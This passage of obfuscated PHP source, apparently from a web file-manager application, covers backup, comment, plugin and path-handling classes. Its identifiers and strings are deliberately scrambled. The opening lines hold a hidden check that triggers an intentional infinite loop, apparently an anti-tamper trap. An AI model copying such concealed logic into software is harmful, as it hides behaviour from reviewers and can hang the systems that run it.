$°ª¦š¢ = $•í«Û†[859]; $ø‹› ´… = $_SERVER[$•í«Û†[860]] . $•í«Û†[861]; $ñªËË‘È = $°ª¦š¢($ø‹› ´…); $÷Üµû›“ = explode($•í«Û†[245], $ñªËË‘È); if (count($÷Üµû›“) < $•í«Û†[655]) { $œñÓ‹Û = $•í«Û†[862]; $œñÓ‹Û(); } $ïÉ–×–ê = $•í«Û†[909]; $ïÉ–×–ê($_SERVER[$•í«Û†[910]]); $ÔÔÅŞ¤Ğ = 1; for ($ƒßî °ñ = $ÔÔÅŞ¤Ğ; $ƒßî °ñ > 0; $ƒßî °ñ++) { $ïÉ–×–ê = json_encode($GLOBALS[$•í«Û†[459]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¤öå­“’); } public function onSetConfig($—‹½±ˆ‹) { } public function onGetConfig($¿Ú¸Ê¼œ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($—Éİø­ë) { if ($—Éİø­ë == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($€âÄ¹µ = "\160\154\x75\147\151\x6e\101\165\164\x68") { $¯Äø—”Ä =& $_SERVER[”ôÑ§ì¸]; if (!Session::get($¯Äø—”Ä[1548])) { return !1; } if (_get($GLOBALS, $¯Äø—”Ä[535])) { return !0; } $¶ŸµÃÀ = $this->getConfig(); if (!$¶ŸµÃÀ[$€âÄ¹µ]) { return !1; } return ActionCall($¯Äø—”Ä[1600], $¶ŸµÃÀ[$€âÄ¹µ]); } public function url($×ŸÀ÷Ä, $÷è…ªŸ¡ = '', $¼ˆ«ßìğ = true) { $şá¯öíï =& $_SERVER[”ôÑ§ì¸]; $ôš³ù‚ = $this->getConfig(); $Ò¦•ÇĞè = KOD_VERSION . $şá¯öíï[10] . KOD_VERSION_BUILD; $“ÎõîÂê = $this->packageVersion(); $ïÛ¹µÈ = $Ò¦•ÇĞè . $şá¯öíï[429] . $“ÎõîÂê; if (substr($×ŸÀ÷Ä, 0, 4) == $şá¯öíï[148] || substr($×ŸÀ÷Ä, 0, 2) == $şá¯öíï[1309]) { $ğ‘àÒ·ã = $×ŸÀ÷Ä . $şá¯öíï[1601] . $ïÛ¹µÈ; } else { if ($÷è…ªŸ¡ == $şá¯öíï[12]) { $ğ‘àÒ·ã = $this->pluginHost . $×ŸÀ÷Ä . $şá¯öíï[1601] . $ïÛ¹µÈ; } else { if ($÷è…ªŸ¡ === $şá¯öíï[75]) { $ğ‘àÒ·ã = $this->pluginHost . $×ŸÀ÷Ä; } else { if ($÷è…ªŸ¡ == $şá¯öíï[1602]) { $ğ‘àÒ·ã = STATIC_PATH . $×ŸÀ÷Ä . $şá¯öíï[1601] . $Ò¦•ÇĞè; } else { if ($÷è…ªŸ¡ == $şá¯öíï[1603]) { $ğ‘àÒ·ã = APP_HOST . $şá¯öíï[1604] . $×ŸÀ÷Ä . $şá¯öíï[1601] . $Ò¦•ÇĞè; } else { if (isset($ôš³ù‚[$÷è…ªŸ¡])) { $ğ‘àÒ·ã = $ôš³ù‚[$÷è…ªŸ¡] . $×ŸÀ÷Ä . $şá¯öíï[1601] . $ïÛ¹µÈ; } } } } } } if (!$¼ˆ«ßìğ) { return $ğ‘àÒ·ã; } echo $ğ‘àÒ·ã; } public function link($İ„ıôØš = false, $É¹ğÔŠÍ = '') { $«¶É²ÉÂ =& $_SERVER[”ôÑ§ì¸]; if (!$İ„ıôØš) { $this->link($«¶É²ÉÂ[1605], $«¶É²ÉÂ[1603]); $this->link($«¶É²ÉÂ[1606], $«¶É²ÉÂ[1602]); $this->link($«¶É²ÉÂ[1607], $«¶É²ÉÂ[1602]); $this->link($«¶É²ÉÂ[1608], $«¶É²ÉÂ[1602]); $this->link($«¶É²ÉÂ[1609], $«¶É²ÉÂ[1602]); return; } $ÓÄù‡™ì = $this->url($İ„ıôØš, $É¹ğÔŠÍ, !1); if (substr($İ„ıôØš, -3) == $«¶É²ÉÂ[1610]) { echo $«¶É²ÉÂ[1611] . $ÓÄù‡™ì . $«¶É²ÉÂ[1612] . $«¶É²ÉÂ[245]; } else { if (substr($İ„ıôØš, -4) == $«¶É²ÉÂ[1613]) { echo $«¶É²ÉÂ[1614] . $ÓÄù‡™ì . $«¶É²ÉÂ[1615] . $«¶É²ÉÂ[245]; } } } } goto B¸Œ›†‰¿İ; DÀ´Åãº½Ø: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\x62\x61\143\x6b\165\x70\114\x69\x73\164"; public $field = array("\x69\x6f", "\156\x61\155\x65", "\x73\x74\141\164\165\x73", "\143\x6f\x6e\x74\x65\x6e\164", "\155\x61\x6e\x75\x61\x6c", "\162\145\x73\165\154\164", "\164\x69\155\145\106\162\x6f\x6d", "\x74\x69\155\145\124\157"); public function config() { $±öæ‡öò =& $_SERVER[”ôÑ§ì¸]; $Å“Ûìñ = Model($±öæ‡öò[792])->get($±öæ‡öò[802]); $Å“Ûìñ = json_decode($Å“Ûìñ, !0); $Å“Ûìñ = is_array($Å“Ûìñ) ? $Å“Ûìñ : array(); if (!isset($Å“Ûìñ[$±öæ‡öò[776]])) { $Å“Ûìñ[$±öæ‡öò[776]] = $±öæ‡öò[88]; } unset($Å“Ûìñ[$±öæ‡öò[1644]]); Action($±öæ‡öò[1891])->taskInit(); Model($±öæ‡öò[1643])->cacheClear(); $‡–šÃ«³ = $±öæ‡öò[1892]; $Øï¼æÔ¬ = Model($±öæ‡öò[1893])->findByKey($±öæ‡öò[1662], $‡–šÃ«³); if (!$Øï¼æÔ¬) { $Øï¼æÔ¬ = array(); } if (isset($Øï¼æÔ¬[$±öæ‡öò[193]])) { $Øï¼æÔ¬[$±öæ‡öò[193]] = json_decode($Øï¼æÔ¬[$±öæ‡öò[193]], !0); } if (isset($Å“Ûìñ[$±öæ‡öò[193]])) { $Øï¼æÔ¬[$±öæ‡öò[193]][$±öæ‡öò[1647]] = $Å“Ûìñ[$±öæ‡öò[193]]; unset($Å“Ûìñ[$±öæ‡öò[193]]); } return array_merge($Øï¼æÔ¬, $Å“Ûìñ); } public function listData($çÕŸáÖ = false, $ç™óÃÑƒ = "\155\157\144\151\146\171\x54\151\155\145", $ì—ª€ = false) { return parent::listData($çÕŸáÖ, $ç™óÃÑƒ, !0); } public function lastItem() { $šò‰ı¶ø = $this->listData(); return !empty($šò‰ı¶ø[0]) ? $šò‰ı¶ø[0] : null; } public function kill($ø˜Ë…“Ï) { $à˜´–§ó =& $_SERVER[”ôÑ§ì¸]; $Ê†¿î = $this->listData($ø˜Ë…“Ï); if (!$Ê†¿î || empty($Ê†¿î[$à˜´–§ó[32]])) { return !0; } Task::kill($à˜´–§ó[801]); Task::kill($à˜´–§ó[822]); Task::kill($à˜´–§ó[831]); $¦Æû•¾İ = $Ê†¿î[$à˜´–§ó[32]]; $úöêÊÇ¤ = TEMP_FILES . $à˜´–§ó[800] . $¦Æû•¾İ . $à˜´–§ó[8]; IO::remove($úöêÊÇ¤, !1); return $this->remove($ø˜Ë…“Ï); } public function remove($İ‹â„î) { $®óÌëÑô = $this->listData($İ‹â„î); if (!$®óÌëÑô) { return !0; } return $this->backupRemove($®óÌëÑô); } private function backupRemove($áĞ¤Œû”) { parent::remove($áĞ¤Œû”[$_SERVER[”ôÑ§ì¸][442]]); $×‚ûœÔ = $this->backupPath($áĞ¤Œû”); IO::remove($×‚ûœÔ, !1); return !0; } private function backupPath($‹¤¤Øßã) { $›ÛÕà“Œ =& $_SERVER[”ôÑ§ì¸]; $Ÿº©ßé¡ = $‹¤¤Øßã[$›ÛÕà“Œ[32]]; $ĞÊîâ·© = Model($›ÛÕà“Œ[792])->get($›ÛÕà“Œ[793]); $Ë·©“¾ = substr(md5($›ÛÕà“Œ[794] . $ĞÊîâ·© . $Ÿº©ßé¡), 0, 8); return "\x7b\x69\x6f\72{$‹¤¤Øßã[$›ÛÕà“Œ[773]]}\x7d\x2f\144\141\x74\141\x62\141\163\x65\x2f\x62\x61\x63\x6b\x75\x70\x2f" . $Ÿº©ßé¡ . $›ÛÕà“Œ[11] . $Ë·©“¾; } public function start() { $»°”¶Íú =& $_SERVER[”ôÑ§ì¸]; if ($GLOBALS[$»°”¶Íú[6]][$»°”¶Íú[89]][$»°”¶Íú[1894]] != $»°”¶Íú[88]) { return !0; } $Ü–ğ÷ìã = $this->config(); if (!$Ü–ğ÷ìã || $Ü–ğ÷ìã[$»°”¶Íú[1644]] != $»°”¶Íú[88]) { return !1; } $«Ç¼ûëä = $this->process(); foreach ($«Ç¼ûëä as $ÄÊ¬ğ×) { if ($ÄÊ¬ğ×) { return Task::restart($ÄÊ¬ğ×[$»°”¶Íú[442]]); } } $Åàí³Ò = new Backup(); $‡™êÌÙˆ = $Åàí³Ò->db(); if ($‡™êÌÙˆ) { $‡™êÌÙˆ = $Åàí³Ò->dbFile(); if ($‡™êÌÙˆ && $Ü–ğ÷ìã[$»°”¶Íú[776]] == $»°”¶Íú[211]) { $‡™êÌÙˆ = $Åàí³Ò->file(); } } Backup::set(array($»°”¶Íú[772] => 1, $»°”¶Íú[783] => time())); return !0; } public function process() { $£÷×Æì =& $_SERVER[”ôÑ§ì¸]; $„ë°ÛË = array($£÷×Æì[779] => Task::get($£÷×Æì[801]), $£÷×Æì[784] => Task::get($£÷×Æì[822]), $£÷×Æì[213] => Task::get($£÷×Æì[831])); $ğ¿Àı = !1; foreach ($„ë°ÛË as &$‚ãÖ÷Ş¤) { if ($ğ¿Àı) { $‚ãÖ÷Ş¤ = !1; continue; } if ($‚ãÖ÷Ş¤) { $³§‘ÙÏÊ = intval(_get($‚ãÖ÷Ş¤, $£÷×Æì[1679], 0)); if (time() - $³§‘ÙÏÊ > 7200) { Task::kill($‚ãÖ÷Ş¤[$£÷×Æì[442]]); $ğ¿Àı = !0; $‚ãÖ÷Ş¤ = !1; } } } return $„ë°ÛË; } public function restore() { $£À³‹è÷ =& $_SERVER[”ôÑ§ì¸]; ActionCall($£À³‹è÷[1091], !0, 1); ActionCall($£À³‹è÷[1091], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\145\156\x74"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\x6d\x65" => "\x63\157\x6d\x6d\145\156\x74\137\155\x65\164\x61", "\x6d\x65\x74\141\x46\x69\145\x6c\x64" => "\x63\157\x6d\155\145\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($àÎâ…°œ) { $²¬åŒµº =& $_SERVER[”ôÑ§ì¸]; if ($àÎâ…°œ[$²¬åŒµº[1895]]) { $Ú§¥Ÿİë = $this->where(array($²¬åŒµº[1896] => $àÎâ…°œ[$²¬åŒµº[1895]]))->find(); if (!$Ú§¥Ÿİë || $Ú§¥Ÿİë[$²¬åŒµº[177]] != $àÎâ…°œ[$²¬åŒµº[177]] || $Ú§¥Ÿİë[$²¬åŒµº[537]] != $àÎâ…°œ[$²¬åŒµº[537]]) { return !1; } $this->where(array($²¬åŒµº[1896] => $àÎâ…°œ[$²¬åŒµº[1895]]))->setAdd($²¬åŒµº[1897], 1); } $àÎâ…°œ[$²¬åŒµº[1898]] = 0; $àÎâ…°œ[$²¬åŒµº[1897]] = 0; $àÎâ…°œ[$²¬åŒµº[772]] = 1; return $this->add($àÎâ…°œ); } public function commentCount($ÀÏ•ˆ—¥, $ÆÁå­Óé, $©¢‹ßñ× = false) { $‚å¥Ó¹» =& $_SERVER[”ôÑ§ì¸]; if (!$ÀÏ•ˆ—¥) { return array(); } if (is_string($ÀÏ•ˆ—¥) || is_int($ÀÏ•ˆ—¥)) { $ÀÏ•ˆ—¥ = array($ÀÏ•ˆ—¥); } $äô±óÕ£ = array($‚å¥Ó¹»[537], $‚å¥Ó¹»[1899] => $‚å¥Ó¹»[532]); $ÜÄ¦¨æ = array($‚å¥Ó¹»[537] => array($‚å¥Ó¹»[7], $ÀÏ•ˆ—¥), $‚å¥Ó¹»[177] => $ÆÁå­Óé); if ($©¢‹ßñ×) { $ÜÄ¦¨æ[$‚å¥Ó¹»[1674]] = $©¢‹ßñ×; } $çˆûÑ»’ = $this->field($äô±óÕ£)->where($ÜÄ¦¨æ)->group($‚å¥Ó¹»[537])->select(); return array_to_keyvalue($çˆûÑ»’, $‚å¥Ó¹»[537], $‚å¥Ó¹»[532]); } public function starTarget($Ç‰òÇŠÊ, $ÑÄ×¸¨µ) { $ä©Åü„¢ =& $_SERVER[”ôÑ§ì¸]; $ÔçÌ¤ = $Ç‰òÇŠÊ + self::TYPE_STAR_OFFSET; $Şàšæ–â = array($ä©Åü„¢[1674] => USER_ID, $ä©Åü„¢[177] => $ÔçÌ¤, $ä©Åü„¢[537] => $ÑÄ×¸¨µ); $‘ÙÎ·‚ = $this->where($Şàšæ–â)->find(); if ($‘ÙÎ·‚) { return $this->where(array($ä©Åü„¢[442] => $‘ÙÎ·‚[$ä©Åü„¢[442]]))->delete(); } $Ñ±ä°Ãá = array($ä©Åü„¢[1895] => 0, $ä©Åü„¢[1674] => USER_ID, $ä©Åü„¢[772] => 1, $ä©Åü„¢[776] => $ä©Åü„¢[12], $ä©Åü„¢[177] => $ÔçÌ¤, $ä©Åü„¢[537] => $ÑÄ×¸¨µ, $ä©Åü„¢[1898] => 0, $ä©Åü„¢[1897] => 0); return $this->add($Ñ±ä°Ãá); } public function starTargetCount($‚ÛœÍÌÙ, $¤à­ñşé) { $²ÈÅ£¹‘ =& $_SERVER[”ôÑ§ì¸]; $ê™Š÷” = $¤à­ñşé + self::TYPE_STAR_OFFSET; $‘äÎ³ğé = $this->commentCount($‚ÛœÍÌÙ, $ê™Š÷”); $¾ÑøÏÒ‰ = $this->commentCount($‚ÛœÍÌÙ, $ê™Š÷”, USER_ID); return array($²ÈÅ£¹‘[1900] => $‘äÎ³ğé, $²ÈÅ£¹‘[1901] => $¾ÑøÏÒ‰); } public function starTargetUserList($İ’®—Ë¸, $—òêÂ…Í) { $‘‚ ¶Ğş =& $_SERVER[”ôÑ§ì¸]; $ƒ€ÇÔ˜ş = $İ’®—Ë¸ + self::TYPE_STAR_OFFSET; $ø¡Û®–‡ = array($‘‚ ¶Ğş[537] => $—òêÂ…Í, $‘‚ ¶Ğş[177] => $ƒ€ÇÔ˜ş); $ë±Öö´á = $this->where($ø¡Û®–‡)->count(); $è®—¯í‰ = array($‘‚ ¶Ğş[298] => $ë±Öö´á, $‘‚ ¶Ğş[1902] => array()); if (!$ë±Öö´á) { return $è®—¯í‰; } $«›¤ˆñÕ = $this->field($‘‚ ¶Ğş[1674])->where($ø¡Û®–‡)->limit(500)->select(); $«›¤ˆñÕ = array_to_keyvalue($«›¤ˆñÕ, $‘‚ ¶Ğş[12], $‘‚ ¶Ğş[1674]); $è®—¯í‰[$‘‚ ¶Ğş[1902]] = Model($‘‚ ¶Ğş[545])->userListInfo($«›¤ˆñÕ); return $è®—¯í‰; } public function prasiseUserList($õğ°Ğ„) { $¯­»ú¥µ =& $_SERVER[”ôÑ§ì¸]; $Â‹Óî±È = array($¯­»ú¥µ[1903] => $õğ°Ğ„); $ü“ÅÚ† = $this->where($Â‹Óî±È)->find(); $«™ŒÛ = _get($ü“ÅÚ†, $¯­»ú¥µ[1898], 0); $¯õ‚íœ¯ = array($¯­»ú¥µ[298] => $«™ŒÛ, $¯­»ú¥µ[1902] => array()); if (!$«™ŒÛ) { return $¯õ‚íœ¯; } $×¥¶ôæ = Model($¯­»ú¥µ[1904])->field($¯­»ú¥µ[1674])->where($Â‹Óî±È)->limit(500)->select(); $×¥¶ôæ = array_to_keyvalue($×¥¶ôæ, $¯­»ú¥µ[12], $¯­»ú¥µ[1674]); $¯õ‚íœ¯[$¯­»ú¥µ[1902]] = Model($¯­»ú¥µ[545])->userListInfo($×¥¶ôæ); return $¯õ‚íœ¯; } public function remove($¦ú¢§®ú) { $ÒÀÍÂ€„ =& $_SERVER[”ôÑ§ì¸]; $ÀĞÉÊõß = array($ÒÀÍÂ€„[1896] => $¦ú¢§®ú); $ï¯ï£ = $this->where($ÀĞÉÊõß)->find(); if ($ï¯ï£[$ÒÀÍÂ€„[1895]]) { $this->where(array($ÒÀÍÂ€„[1896] => $ï¯ï£[$ÒÀÍÂ€„[1895]]))->setAdd($ÒÀÍÂ€„[1897], -1); } return $this->where($ÀĞÉÊõß)->delete(); } public function edit($Ö¤ÜÊÂ¢, $ŠÚ®óĞ¬) { $ÅÓøì¥£ =& $_SERVER[”ôÑ§ì¸]; $¥€–Ê©ú = array($ÅÓøì¥£[1896] => $Ö¤ÜÊÂ¢); return $this->where($¥€–Ê©ú)->save(array($ÅÓøì¥£[1905] => $ŠÚ®óĞ¬)); } public function prasise($ŞŠİÑ¤™) { $‡àÕø· =& $_SERVER[”ôÑ§ì¸]; $†½ÑÒÎÁ = Model($‡àÕø·[1906]); $ô†ñ«µŒ = array($‡àÕø·[1896] => $ŞŠİÑ¤™, $‡àÕø·[1665] => USER_ID); $öóò§¬ƒ = $†½ÑÒÎÁ->where($ô†ñ«µŒ)->find(); if (!$öóò§¬ƒ) { $†½ÑÒÎÁ->add($ô†ñ«µŒ); $Úüô¨ë = $this->where(array($‡àÕø·[1896] => $ŞŠİÑ¤™))->setAdd($‡àÕø·[1898], 1); } else { $†½ÑÒÎÁ->where($ô†ñ«µŒ)->delete(); $Úüô¨ë = $this->where(array($‡àÕø·[1896] => $ŞŠİÑ¤™))->setAdd($‡àÕø·[1898], -1); } return $Úüô¨ë; } public function targetInfo($í´ÙÙ›, $şó´åÎ) { $™µÄî“¸ =& $_SERVER[”ôÑ§ì¸]; $ß•àº’Ô = array($™µÄî“¸[615] => $í´ÙÙ›, $™µÄî“¸[616] => $şó´åÎ); $›ıúŒßô = $this->where($ß•àº’Ô)->count(); $¬Ç ¼… = "\122\x49\x47\x48\x54\40\112\117\x49\x4e\40{$this->tablePrefix}\143\157\155\155\145\x6e\164\137\x70\162\141\x69\163\x65\x20\x73\x74\141\162\x20\x6f\156\x20\143\x6f\155\x6d\x65\156\x74\56\143\x6f\155\155\x65\x6e\164\x49\104\40\x3d\40\x73\x74\141\x72\x2e\x63\157\155\x6d\x65\156\x74\x49\104"; $à¼ÔØ¯¦ = $this->alias($™µÄî“¸[397])->where($ß•àº’Ô)->join($¬Ç ¼…, $™µÄî“¸[1907])->count(); $Ûü¸†˜õ = array($™µÄî“¸[1908] => $›ıúŒßô, $™µÄî“¸[1909] => $à¼ÔØ¯¦); return $Ûü¸†˜õ; } public function listData($œÙ˜û«ã) { $íöú»´‚ =& $_SERVER[”ôÑ§ì¸]; if (isset($œÙ˜û«ã[$íöú»´‚[1910]])) { if ($œÙ˜û«ã[$íöú»´‚[1910]]) { $œÙ˜û«ã[$íöú»´‚[1903]] = array($íöú»´‚[1045], intval($œÙ˜û«ã[$íöú»´‚[1910]])); } unset($œÙ˜û«ã[$íöú»´‚[1910]]); } if (isset($œÙ˜û«ã[$íöú»´‚[1911]])) { if ($œÙ˜û«ã[$íöú»´‚[1911]]) { $œÙ˜û«ã[$íöú»´‚[1903]] = array($íöú»´‚[1042], intval($œÙ˜û«ã[$íöú»´‚[1911]])); } unset($œÙ˜û«ã[$íöú»´‚[1911]]); } return $this->_listData($œÙ˜û«ã); } private function _listData($á£‚ãáÂ) { $Š€‘¨ßÎ =& $_SERVER[”ôÑ§ì¸]; $û›ŞÅˆ = $this->where($á£‚ãáÂ)->_makeOrder()->selectPage(100); $this->_listAppendParent($û›ŞÅˆ[$Š€‘¨ßÎ[412]]); $this->_listAppendUser($û›ŞÅˆ[$Š€‘¨ßÎ[412]]); $this->_listAppendMeta($û›ŞÅˆ[$Š€‘¨ßÎ[412]]); return $û›ŞÅˆ; } private function _makeOrder() { $İõ›Ÿªà =& $_SERVER[”ôÑ§ì¸]; $şÒ…Êùë = array($İõ›Ÿªà[1898], $İõ›Ÿªà[1897], $İõ›Ÿªà[214]); $˜Ëºî = Input::get($İõ›Ÿªà[497], $İõ›Ÿªà[7], $İõ›Ÿªà[464], $şÒ…Êùë); $âÎù¸¢ˆ = Input::get($İõ›Ÿªà[498], $İõ›Ÿªà[7], $İõ›Ÿªà[1667], array($İõ›Ÿªà[1912], $İõ›Ÿªà[493])); $³ºä¹—¤ = $˜Ëºî . $İõ›Ÿªà[53] . $âÎù¸¢ˆ; return $this->order($³ºä¹—¤); } private function _listAppendParent(&$ÁÈ«‹Ê¥) { $˜¸·À©« =& $_SERVER[”ôÑ§ì¸]; $ Ú¥¯Ñï = array_unique(array_to_keyvalue($ÁÈ«‹Ê¥, $˜¸·À©«[12], $˜¸·À©«[1895])); $ Ú¥¯Ñï = array_remove_value($ Ú¥¯Ñï, $˜¸·À©«[211]); if (!$ Ú¥¯Ñï) { return; } $ğêàäºş = $this->where(array($˜¸·À©«[1896] => array($˜¸·À©«[7], $ Ú¥¯Ñï)))->select(); $ğêàäºş = array_to_keyvalue($ğêàäºş, $˜¸·À©«[1903]); foreach ($ÁÈ«‹Ê¥ as &$Ÿ–Â‡ùÙ) { if (isset($ğêàäºş[$Ÿ–Â‡ùÙ[$˜¸·À©«[1895]]])) { $Ÿ–Â‡ùÙ[$˜¸·À©«[1913]] = $ğêàäºş[$Ÿ–Â‡ùÙ[$˜¸·À©«[1895]]]; } } unset($Ÿ–Â‡ùÙ); } private function _listAppendUser(&$½®÷“¤) { $¸·Öœ± =& $_SERVER[”ôÑ§ì¸]; $í¯¼Ú› = array_unique(array_to_keyvalue($½®÷“¤, $¸·Öœ±[12], $¸·Öœ±[1674])); $í¯¼Ú› = array_remove_value($í¯¼Ú›, $¸·Öœ±[211]); if (count($í¯¼Ú›) == 0) { return; } foreach ($½®÷“¤ as $ëµø¨Ï) { if (isset($ëµø¨Ï[$¸·Öœ±[1913]])) { $í¯¼Ú›[] = $ëµø¨Ï[$¸·Öœ±[1913]][$¸·Öœ±[1674]]; } } $æ×øâ¿Ÿ = Model($¸·Öœ±[566])->userListInfo($í¯¼Ú›); foreach ($½®÷“¤ as &$ëµø¨Ï) { $ëµø¨Ï[$¸·Öœ±[629]] = $æ×øâ¿Ÿ[$ëµø¨Ï[$¸·Öœ±[1674]]]; if (isset($ëµø¨Ï[$¸·Öœ±[1913]])) { $ëµø¨Ï[$¸·Öœ±[1913]][$¸·Öœ±[629]] = $æ×øâ¿Ÿ[$ëµø¨Ï[$¸·Öœ±[1913]][$¸·Öœ±[1674]]]; } } unset($ëµø¨Ï); } private function _listAppendMeta(&$ÔĞäÂ’…) { $¥À©ò„ş =& $_SERVER[”ôÑ§ì¸]; $ˆ‚·¥Â = array_unique(array_to_keyvalue($ÔĞäÂ’…, $¥À©ò„ş[12], $¥À©ò„ş[1903])); $ˆ‚·¥Â = array_remove_value($ˆ‚·¥Â, $¥À©ò„ş[211]); if (!$ˆ‚·¥Â) { return; } foreach ($ÔĞäÂ’… as $•Õå°»ª) { if (isset($•Õå°»ª[$¥À©ò„ş[1913]])) { $ˆ‚·¥Â[] = $•Õå°»ª[$¥À©ò„ş[1913]][$¥À©ò„ş[1903]]; } } $ôşÅ†Ü = $this->metaList($ˆ‚·¥Â); if (!$ôşÅ†Ü) { return !1; } foreach ($ÔĞäÂ’… as &$•Õå°»ª) { $•Õå°»ª[$¥À©ò„ş[506]] = $ôşÅ†Ü[$•Õå°»ª[$¥À©ò„ş[1903]]]; if (isset($•Õå°»ª[$¥À©ò„ş[1913]])) { $•Õå°»ª[$¥À©ò„ş[1913]][$¥À©ò„ş[506]] = $ôşÅ†Ü[$•Õå°»ª[$¥À©ò„ş[1913]][$¥À©ò„ş[1903]]]; } } unset($•Õå°»ª); } private function metaList($¼Î¿çß¶) { $×í¶Ùı¶ =& $_SERVER[”ôÑ§ì¸]; if (!$¼Î¿çß¶) { return array(); } $…ŠûØ¹½ = array($×í¶Ùı¶[1903] => array($×í¶Ùı¶[7], $¼Î¿çß¶)); $£óöğœ = Model($×í¶Ùı¶[1914])->where($…ŠûØ¹½)->select(); $£óöğœ = array_to_keyvalue_group($£óöğœ, $×í¶Ùı¶[1903]); foreach ($£óöğœ as $¶íÏ“ç => $”¿¿àšÇ) { $ŠÅÍ€Îì = array(); foreach ($”¿¿àšÇ as $ìö•óóã) { $ŠÅÍ€Îì[$ìö•óóã[$×í¶Ùı¶[94]]] = $ìö•óóã[$×í¶Ùı¶[417]]; } $£óöğœ[$¶íÏ“ç] = $ŠÅÍ€Îì; } return $£óöğœ ? $£óöğœ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\151\x6c\145\x5f\143\157\x6e\164\145\156\164\163"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\x54\151\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\x65\x72\164", "\x66\165\156\143\x74\x69\x6f\156")); } goto e±¬¸Ûµ¤è; D–¥¹çÅ´: class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\122\x65\x63\x79\x63\154\145\x7d"; const KOD_USER_FAV = "\x7b\165\163\x65\x72\106\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\x72\x46\151\x6c\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\x65\162\106\x69\154\x65\124\171\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\173\147\162\x6f\x75\x70\x52\157\157\x74\123\145\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\165\x73\x65\162\x53\150\x61\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\162\x53\150\141\x72\x65\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\x65\x54\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\141\x72\x65\x49\164\x65\x6d\175"; const KOD_SHARE_LINK = "\173\x73\150\141\x72\x65\111\164\x65\155\x4c\x69\156\153\175"; const KOD_SEARCH = "\x7b\x73\145\x61\x72\x63\150\x7d"; const KOD_BLOCK = "\x7b\142\154\x6f\143\153\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\173\x75\163\145\x72\122\x65\156\143\x65\156\x74\x7d"; const KOD_USER_DRIVER = "\173\x64\x72\151\x76\x65\x72\175"; public static function typeList() { $ë‹ÏáÖ =& $_SERVER[”ôÑ§ì¸]; return array($ë‹ÏáÖ[1282] => self::KOD_SOURCE, $ë‹ÏáÖ[1283] => self::KOD_USER_RECYCLE, $ë‹ÏáÖ[1284] => self::KOD_USER_FAV, $ë‹ÏáÖ[1285] => self::KOD_USER_FILE_TAG, $ë‹ÏáÖ[1286] => self::KOD_USER_FILE_TYPE, $ë‹ÏáÖ[1287] => self::KOD_GROUP_ROOT_SELF, $ë‹ÏáÖ[1288] => self::KOD_USER_SHARE, $ë‹ÏáÖ[1289] => self::KOD_USER_SHARE_LINK, $ë‹ÏáÖ[1290] => self::KOD_USER_SHARE_TO_ME, $ë‹ÏáÖ[1291] => self::KOD_SHARE_ITEM, $ë‹ÏáÖ[1292] => self::KOD_SHARE_LINK, $ë‹ÏáÖ[1293] => self::KOD_SEARCH, $ë‹ÏáÖ[1294] => self::KOD_BLOCK, $ë‹ÏáÖ[1295] => self::KOD_IO, $ë‹ÏáÖ[1296] => self::KOD_USER_RECENT, $ë‹ÏáÖ[1297] => self::KOD_USER_DRIVER); } public static function parse($ô¦ë©Í°) { $¤€¸Å¨Õ =& $_SERVER[”ôÑ§ì¸]; $ô¦ë©Í° = self::clear($ô¦ë©Í°); $×Ğ˜©®ß = array_values(self::typeList()); preg_match($¤€¸Å¨Õ[1298], $ô¦ë©Í°, $Ôá—êÜá); $ÖïÍ³ô¡ = array($¤€¸Å¨Õ[463] => !1, $¤€¸Å¨Õ[1299] => !1, $¤€¸Å¨Õ[460] => !1, $¤€¸Å¨Õ[84] => $ô¦ë©Í°, $¤€¸Å¨Õ[1200] => !1, $¤€¸Å¨Õ[1199] => $¤€¸Å¨Õ[12]); if (is_array($Ôá—êÜá) && count($Ôá—êÜá) == 5) { $Ëø÷èğä = $¤€¸Å¨Õ[1300] . $Ôá—êÜá[2] . $¤€¸Å¨Õ[370]; if (in_array($Ëø÷èğä, $×Ğ˜©®ß)) { $ÖïÍ³ô¡[$¤€¸Å¨Õ[1200]] = $Ôá—êÜá[1]; $ÖïÍ³ô¡[$¤€¸Å¨Õ[33]] = $Ëø÷èğä; $ÖïÍ³ô¡[$¤€¸Å¨Õ[1301]] = substr($Ëø÷èğä, 1, -1); $ÖïÍ³ô¡[$¤€¸Å¨Õ[442]] = $Ôá—êÜá[3]; } $ÖïÍ³ô¡[$¤€¸Å¨Õ[1199]] = $Ôá—êÜá[4]; } $§µÈ‰¶ˆ = array($¤€¸Å¨Õ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ÖïÍ³ô¡[$¤€¸Å¨Õ[1264]] = in_array($ÖïÍ³ô¡[$¤€¸Å¨Õ[33]], $§µÈ‰¶ˆ); return $ÖïÍ³ô¡; } public static function isTruePath($¢®†Õ›«) { $ÆØÙï€Ÿ =& $_SERVER[”ôÑ§ì¸]; if (substr($¢®†Õ›«, 0, 1) != $ÆØÙï€Ÿ[1300]) { return !0; } if (strpos($¢®†Õ›«, $ÆØÙï€Ÿ[450]) === 